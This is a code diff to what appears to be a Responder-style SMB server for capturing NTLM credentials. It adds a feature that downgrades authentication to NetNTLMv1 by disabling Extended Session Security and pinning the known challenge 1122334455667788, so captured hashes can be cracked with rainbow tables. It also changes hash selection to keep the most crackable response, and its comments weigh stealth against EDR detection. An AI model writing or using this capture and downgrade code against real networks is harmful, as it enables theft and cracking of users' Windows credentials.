@@ -302,14 +302,21 @@ def extract_ntlm_hash(gssapi: object) -> NtlmCaptureResult | None:
     if not creds_list:
         return None
 
-    cred = creds_list[0]
-    ctype = str(getattr(cred, "ctype", "") or "").lower()
-    if "v2" in ctype:
-        version = "NTLMv2"
-    elif "v1" in ctype or "ntlm" in ctype:
-        version = "NTLMv1"
-    else:
+    # A single authenticate can yield multiple credential encodings. A downgraded
+    # NetNTLMv1 comes back as ``[netLM, netNTLMv1]`` (LM first), and the LM-only
+    # forms (netLM / netLMv2) are not hashcat-crackable — so picking ``[0]`` would
+    # drop the crackable hash. Prefer the NT-based response, most-crackable first.
+    _CTYPE_RANK = {"netntlmv2": 0, "netntlmv1": 1, "netntlmv1-ess": 2}
+
+    def _rank(candidate: object) -> int:
+        return _CTYPE_RANK.get(str(getattr(candidate, "ctype", "") or "").lower(), 99)
+
+    cred = min(creds_list, key=_rank)
+    if _rank(cred) == 99:
+        # Only LM-only encodings were captured — nothing hashcat can crack.
         return None
+    ctype = str(getattr(cred, "ctype", "") or "").lower()
+    version = "NTLMv2" if "v2" in ctype else "NTLMv1"
 
     fullhash = getattr(cred, "fullhash", None)
     if not fullhash:
@@ -333,6 +340,15 @@ class SMBNtlmCaptureConfig:
 
     listen_host: str = "0.0.0.0"
     listen_port: int = 445
+    # NTLMv1 downgrade-capture (Responder --disable-ess parity). When True the
+    # server clears Extended Session Security and pins the challenge so a
+    # v1-capable client returns a crack.sh-rainbow-crackable plain NetNTLMv1.
+    # Default OFF: ordinary capture keeps ESS + a random challenge (modern
+    # clients still return NetNTLMv2). Only opt in against a KNOWN v1-capable
+    # host and outside max-stealth posture — the pinned challenge is the
+    # Responder IOC (MDI/EDR alert on 1122334455667788).
+    force_ntlm_downgrade: bool = False
+    challenge: bytes | None = None
 
 
 class SMBNtlmCaptureSource:
@@ -390,6 +406,7 @@ class SMBNtlmCaptureSource:
 
         capture_queue = self._capture_queue
         observer = self._observer
+        config = self._config
 
         def _make_gssapi() -> _SPNEGOCaptureAdapter:
             cred = NTLMCredential(
@@ -398,6 +415,18 @@ class SMBNtlmCaptureSource:
                 domain="",
                 stype=asyauthSecret.PASSWORD,
             )
+            # NTLMv1 downgrade knobs (read by NTLMServerNative via getattr /
+            # credential.challenge). Default OFF leaves the credential untouched,
+            # so ordinary capture is byte-identical (random challenge + ESS on).
+            if config.force_ntlm_downgrade:
+                cred.force_ntlm_downgrade = True
+                cred.challenge = (
+                    config.challenge
+                    if config.challenge is not None
+                    else bytes.fromhex("1122334455667788")
+                )
+            elif config.challenge is not None:
+                cred.challenge = config.challenge
             ntlm_server = NTLMServerNative(cred)
             inner = SPNEGOserver(capture_queue)
             inner.add_auth_context(
